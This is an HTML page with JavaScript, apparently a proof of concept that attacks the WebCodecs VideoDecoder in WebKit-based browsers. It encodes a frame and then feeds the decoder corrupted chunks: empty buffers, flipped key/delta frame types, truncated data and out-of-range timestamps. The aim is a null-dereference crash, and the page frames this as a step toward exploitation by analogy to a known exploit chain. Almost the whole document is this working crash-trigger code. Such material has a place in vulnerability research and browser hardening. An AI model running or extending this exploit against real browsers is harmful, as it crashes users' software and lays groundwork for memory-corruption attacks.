<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebCodecs VideoDecoder Crash Analysis</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #1a1a1a; color: #00ff00; }
        #log { white-space: pre-wrap; border: 1px solid #333; padding: 10px; max-height: 500px; overflow-y: auto; }
        .error { color: #ff4444; }
        .info { color: #44ff44; }
        .warn { color: #ffaa00; }
        canvas { border: 1px solid #333; display: none; }
    </style>
</head>
<body>
    <h2>WebCodecs VideoDecoder Null Dereference Analysis</h2>
    <p>This PoC demonstrates a crash pattern in WebKit's WebCodecs decoder implementation.</p>
    
    <canvas id="c" width="320" height="240"></canvas>
    <div id="log"></div>

<script>
// ============================================================================
// WebCodecs VideoDecoder Exploitation Analysis
// ============================================================================
// This PoC targets the WebCodecs API implementation in WebKit to trigger
// a crash near null in the decoder module. The technique involves:
//
// 1. Type confusion via keyframe/delta frame mislabeling
// 2. Empty data buffer handling vulnerabilities  
// 3. Decoder state machine corruption
//
// Similar to how the Coruna exploit chain uses WASM JIT type confusion,
// this targets the media decoder pipeline which runs with different
// privilege levels and may provide alternative exploitation paths.
// ============================================================================

const log = (msg, type = 'info') => {
    const el = document.getElementById('log');
    const line = document.createElement('div');
    line.className = type;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    el.appendChild(line);
    console.log(msg);
};

// ============================================================================
// Exploit Configuration
// ============================================================================
const CONFIG = {
    width: 320,
    height: 240,
    
    // Number of chunks to store for replay attacks
    maxStoredChunks: 20,
    
    // Enable various corruption techniques
    enableTypeConfusion: true,
    enableEmptyData: true,
    enableTimestampManipulation: true,
    
    // Codec candidates in order of preference
    // Different engines prefer different codec strings
    codecCandidates: [
        { codec: "vp8", label: "VP8" },                    // Universal baseline
        { codec: "vp09.00.10.08", label: "VP9" },         // Chromium preferred
        { codec: "vp9", label: "VP9 (Gecko)" },           // Gecko preferred
    ]
};

// Detect browser engine
function detectEngine() {
    const ua = navigator.userAgent.toLowerCase();
    if (ua.includes('firefox') || ua.includes('gecko')) return 'gecko';
    if (ua.includes('chrome') || ua.includes('chromium') || ua.includes('edge')) return 'chromium';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'webkit';
    return 'unknown';
}

// ============================================================================
// Global State
// ============================================================================
let encodedVideoChunks = [];
let lastVideoDecoderConfig = null;
let crashTriggered = false;

// ============================================================================
// VideoEncoder Output Handler
// ============================================================================
function videoEncoderOutput(chunk, metadata) {
    log(`Encoder output: type=${chunk.type}, timestamp=${chunk.timestamp}, size=${chunk.byteLength} bytes`);
    
    // Store chunks for later replay/corruption
    if (encodedVideoChunks.length < CONFIG.maxStoredChunks) {
        encodedVideoChunks.push({
            chunk: chunk,
            metadata: metadata,
            // Keep reference to original data for analysis
            originalType: chunk.type,
            originalTimestamp: chunk.timestamp
        });
    }
    
    // Capture decoder configuration for decoder setup
    if (metadata && metadata.decoderConfig) {
        lastVideoDecoderConfig = metadata.decoderConfig;
        log(`Decoder config captured: ${JSON.stringify(metadata.decoderConfig)}`);
    }
}

// ============================================================================
// Crash Analysis Utilities
// ============================================================================
class DecoderCrashAnalyzer {
    constructor() {
        this.attempts = [];
        this.patterns = [
            'null-deref',
            'type-confusion',
            'use-after-free',
            'out-of-bounds'
        ];
    }
    
    logAttempt(technique, details) {
        const attempt = {
            timestamp: Date.now(),
            technique: technique,
            details: details
        };
        this.attempts.push(attempt);
        log(`Attempt: ${technique} - ${details}`, 'warn');
    }
    
    // Analyze decoder behavior with corrupted input
    analyzeDecoderBehavior(decoder, corruptedChunk) {
        try {
            decoder.decode(corruptedChunk);
            return { success: true, error: null };
        } catch (e) {
            return { success: false, error: e };
        }
    }
}

const analyzer = new DecoderCrashAnalyzer();

// ============================================================================
// Corruption Techniques
// ============================================================================

/**
 * Technique 1: Type Confusion
 * 
 * The key technique in the original PoC - flip key/delta frame types.
 * A delta frame (P-frame) depends on previous frames for decoding.
 * If the decoder receives a delta frame labeled as key (I-frame),
 * it may dereference null pointers for reference frame data.
 */
function createTypeConfusedChunk(originalChunk) {
    const buf = new Uint8Array(originalChunk.byteLength);
    originalChunk.copyTo(buf);
    
    // Flip the type - this is the core confusion:
    // "key" frames are self-contained
    // "delta" frames depend on previous state
    // Feeding delta data as key or vice versa causes state confusion
    const confusedType = originalChunk.type === "key" ? "delta" : "key";
    
    analyzer.logAttempt('type-confusion', 
        `Original: ${originalChunk.type}, Confused: ${confusedType}`);
    
    return new EncodedVideoChunk({
        type: confusedType,
        timestamp: originalChunk.timestamp,
        data: buf
    });
}

/**
 * Technique 2: Empty Data Injection
 * 
 * Empty data buffers can trigger null pointer dereferences in the
 * decoder's parsing logic when it tries to read headers/footers.
 * Note: Use 'delta' type since empty data cannot be a valid keyframe.
 */
function createEmptyChunk(timestamp = 1000000) {
    analyzer.logAttempt('empty-data', 'Zero-byte payload');
    
    return new EncodedVideoChunk({
        type: "delta",  // Changed from 'key' - empty data can't be valid keyframe
        timestamp: timestamp,
        data: new Uint8Array(0)  // Empty data - classic null deref trigger
    });
}

/**
 * Technique 3: Timestamp Manipulation
 * 
 * Non-monotonic timestamps or negative values can confuse the
 * decoder's frame reordering logic.
 */
function createTimestampCorruptedChunk(baseChunk, offset) {
    const buf = new Uint8Array(baseChunk.byteLength);
    baseChunk.copyTo(buf);
    
    const corruptedTimestamp = baseChunk.timestamp + offset;
    analyzer.logAttempt('timestamp-manipulation', 
        `Original: ${baseChunk.timestamp}, New: ${corruptedTimestamp}`);
    
    return new EncodedVideoChunk({
        type: baseChunk.type,
        timestamp: corruptedTimestamp,
        data: buf
    });
}

/**
 * Technique 4: Truncated Data
 * 
 * Partial frame data can cause out-of-bounds reads when the decoder
 * tries to parse frame headers expecting more data than available.
 */
function createTruncatedChunk(originalChunk, keepBytes) {
    const originalData = new Uint8Array(originalChunk.byteLength);
    originalChunk.copyTo(originalData);
    
    const truncated = originalData.slice(0, keepBytes);
    analyzer.logAttempt('truncated-data', 
        `Original: ${originalChunk.byteLength}, Truncated: ${keepBytes}`);
    
    return new EncodedVideoChunk({
        type: originalChunk.type,
        timestamp: originalChunk.timestamp,
        data: truncated
    });
}

// ============================================================================
// Main Exploit Flow
// ============================================================================
document.addEventListener("DOMContentLoaded", async () => {
    log("=== WebCodecs Decoder Analysis Started ===");
    
    try {
        // Check WebCodecs support
        if (typeof VideoEncoder === 'undefined' || typeof VideoDecoder === 'undefined') {
            log("ERROR: WebCodecs API not supported in this browser", 'error');
            
            const engine = detectEngine();
            if (engine === 'gecko') {
                log("Firefox: Enable WebCodecs in about:config", 'warn');
                log("  1. Type about:config in address bar", 'warn');
                log("  2. Search for dom.media.webcodecs.enabled", 'warn');
                log("  3. Set to true and restart", 'warn');
            } else if (engine === 'chromium') {
                log("Chromium: Check chrome://flags/#enable-webcodecs", 'warn');
            }
            return;
        }
        
        log("WebCodecs API supported - initializing...");
        
        // Initialize encoder and decoder
        const videoEncoder = new VideoEncoder({
            output: videoEncoderOutput,
            error: (e) => {
                log(`Encoder error: ${e.message}`, 'error');
            }
        });
        
        const videoDecoder = new VideoDecoder({
            output: (frame) => {
                log(`Decoder output: frame ${frame.timestamp}`);
                frame.close();
            },
            error: (e) => {
                log(`Decoder error: ${e.message}`, 'error');
            }
        });
        
        // Find a working codec
        let selectedCodec = null;
        let encoderConfig = null;
        
        const engine = detectEngine();
        log(`Detected engine: ${engine}`);
        
        // Reorder candidates based on engine
        let candidates = [...CONFIG.codecCandidates];
        if (engine === 'gecko') {
            // Gecko prefers simpler codec strings
            candidates.sort((a, b) => {
                if (a.codec === 'vp9') return -1;
                if (b.codec === 'vp9') return 1;
                return 0;
            });
        }
        
        for (const candidate of candidates) {
            encoderConfig = {
                codec: candidate.codec,
                width: CONFIG.width,
                height: CONFIG.height,
                bitrate: 1000000,
                framerate: 30,
                latencyMode: 'quality',
                hardwareAcceleration: 'prefer-software'  // More consistent across engines
            };
            
            try {
                const support = await VideoEncoder.isConfigSupported(encoderConfig);
                if (support.supported) {
                    selectedCodec = candidate;
                    log(`Using codec: ${candidate.label} (${candidate.codec})`);
                    break;
                }
            } catch (e) {
                log(`Codec check failed for ${candidate.codec}: ${e.message}`, 'warn');
            }
        }
        
        if (!selectedCodec) {
            log("No supported codec found. WebCodecs may not be enabled.", 'error');
            log("Firefox: set dom.media.webcodecs.enabled=true in about:config", 'warn');
            return;
        }
        
        videoEncoder.configure(encoderConfig);
        
        // Create a frame from canvas
        const canvas = document.getElementById('c');
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#ff0000';
        ctx.fillRect(0, 0, CONFIG.width, CONFIG.height);
        
        const frame = new VideoFrame(canvas, { timestamp: 0 });
        log(`Created VideoFrame: ${frame.codedWidth}x${frame.codedHeight}`);
        
        // Encode the frame
        log("Encoding frame...");
        videoEncoder.encode(frame, {});
        frame.close();
        
        await videoEncoder.flush();
        log(`Encoding complete. Chunks stored: ${encodedVideoChunks.length}`);
        
        // Configure decoder with captured config
        if (lastVideoDecoderConfig) {
            log("Configuring decoder with captured config...");
            // Ensure codec string is preserved from encoder
            const decoderConfig = {
                ...lastVideoDecoderConfig,
                codec: encoderConfig.codec  // Use the working codec string
            };
            videoDecoder.configure(decoderConfig);
        } else {
            // Fallback: manually create decoder config if encoder didn't provide one
            log("No decoder config from encoder, using fallback...");
            const fallbackConfig = {
                codec: encoderConfig.codec,
                codedWidth: CONFIG.width,
                codedHeight: CONFIG.height
            };
            
            try {
                const decoderSupport = await VideoDecoder.isConfigSupported(fallbackConfig);
                if (decoderSupport.supported) {
                    videoDecoder.configure(fallbackConfig);
                    log("Decoder configured with fallback config");
                } else {
                    log(`Decoder config not supported: ${JSON.stringify(decoderSupport)}`, 'error');
                    return;
                }
            } catch (e) {
                log(`Decoder config error: ${e.message}`, 'error');
                return;
            }
        }
        
        // Check if decoder is configured before running tests
        if (!videoDecoder.state || videoDecoder.state === "unconfigured") {
            log("Decoder not configured - skipping decode tests", 'warn');
            return;
        }
        
        // ============================================================================
        // Prime decoder with valid keyframe first
        // This is required - decoder needs a valid keyframe before accepting any data
        // ============================================================================
        log("\n=== Priming decoder with valid keyframe ===");
        
        if (encodedVideoChunks.length > 0 && encodedVideoChunks[0].chunk.type === 'key') {
            const original = encodedVideoChunks[0].chunk;
            const buf = new Uint8Array(original.byteLength);
            original.copyTo(buf);
            
            const keyChunk = new EncodedVideoChunk({
                type: 'key',
                timestamp: 0,
                data: buf
            });
            
            try {
                videoDecoder.decode(keyChunk);
                await videoDecoder.flush();
                log("Decoder primed successfully");
            } catch (e) {
                log(`Failed to prime decoder: ${e.message}`, 'error');
                return;
            }
        } else {
            log("No valid keyframe available to prime decoder", 'error');
            return;
        }
        
        // Helper to check decoder state
        const isDecoderReady = () => videoDecoder && videoDecoder.state !== 'closed';
        
        // ============================================================================
        // Phase 1: Empty Data Injection (Original PoC technique)
        // ============================================================================
        log("\n=== Phase 1: Empty Data Injection ===");
        
        if (!isDecoderReady()) {
            log("Decoder not ready, skipping", 'warn');
        } else {
            // Use delta type - empty data can't be a valid keyframe
            const emptyChunk = new EncodedVideoChunk({
                type: "delta",
                timestamp: 1000000,
                data: new Uint8Array(0)
            });
            
            try {
                videoDecoder.decode(emptyChunk);
                log("Empty chunk decode initiated (may crash async)");
            } catch (e) {
                log(`Empty chunk error: ${e.message}`, 'error');
            }
        }
        
        // ============================================================================
        // Phase 2: Type Confusion Attack
        // ============================================================================
        if (encodedVideoChunks.length > 0 && CONFIG.enableTypeConfusion) {
            log("\n=== Phase 2: Type Confusion Attack ===");
            
            if (!isDecoderReady()) {
                log("Decoder not ready, skipping", 'warn');
            } else {
                const original = encodedVideoChunks[0].chunk;
                const confusedChunk = createTypeConfusedChunk(original);
                
                try {
                    videoDecoder.decode(confusedChunk);
                    log("Confused chunk decode initiated");
                } catch (e) {
                    log(`Type confusion error: ${e.message}`, 'error');
                }
            }
        }
        
        // ============================================================================
        // Phase 3: Truncated Data Attack
        // ============================================================================
        if (encodedVideoChunks.length > 0) {
            log("\n=== Phase 3: Truncated Data Attack ===");
            
            if (!isDecoderReady()) {
                log("Decoder not ready, skipping", 'warn');
            } else {
                const original = encodedVideoChunks[0].chunk;
                const truncatedChunk = createTruncatedChunk(original, 10);
                
                // Change to delta since truncated data won't be valid keyframe
                const corruptedChunk = new EncodedVideoChunk({
                    type: 'delta',
                    timestamp: Date.now() * 1000,
                    data: truncatedChunk.data
                });
                
                try {
                    videoDecoder.decode(corruptedChunk);
                    log("Truncated chunk decode initiated");
                } catch (e) {
                    log(`Truncation error: ${e.message}`, 'error');
                }
            }
        }
        
        // ============================================================================
        // Phase 4: Timestamp Manipulation
        // ============================================================================
        if (encodedVideoChunks.length > 0 && CONFIG.enableTimestampManipulation) {
            log("\n=== Phase 4: Timestamp Manipulation ===");
            
            if (!isDecoderReady()) {
                log("Decoder not ready, skipping", 'warn');
            } else {
                const original = encodedVideoChunks[0].chunk;
                
                // Negative timestamp - use delta type
                const negativeChunk = new EncodedVideoChunk({
                    type: 'delta',
                    timestamp: -2000000,
                    data: new Uint8Array(10)
                });
                try {
                    videoDecoder.decode(negativeChunk);
                    log("Negative timestamp chunk decode initiated");
                } catch (e) {
                    log(`Negative timestamp error: ${e.message}`, 'error');
                }
                
                // Large timestamp gap
                if (isDecoderReady()) {
                    const largeGapChunk = new EncodedVideoChunk({
                        type: 'delta',
                        timestamp: 1000000000,
                        data: new Uint8Array(10)
                    });
                    try {
                        videoDecoder.decode(largeGapChunk);
                        log("Large gap chunk decode initiated");
                    } catch (e) {
                        log(`Large gap error: ${e.message}`, 'error');
                    }
                }
            }
        }
        
        // Force decoder flush to process pending decodes
        log("\nFlushing decoder...");
        try {
            await videoDecoder.flush();
        } catch (e) {
            log(`Flush error: ${e.message}`, 'error');
        }
        
        log("\n=== Analysis Complete ===");
        
        if (!crashTriggered) {
            log("No immediate crash detected. Check browser console and crash logs.");
            log("Some crashes occur asynchronously in the decoder thread.");
        }
        
        // Cleanup
        videoEncoder.close();
        videoDecoder.close();
        
    } catch (error) {
        log(`Fatal error: ${error.message}`, 'error');
        console.error(error);
    }
});
</script>
</body>
</html>
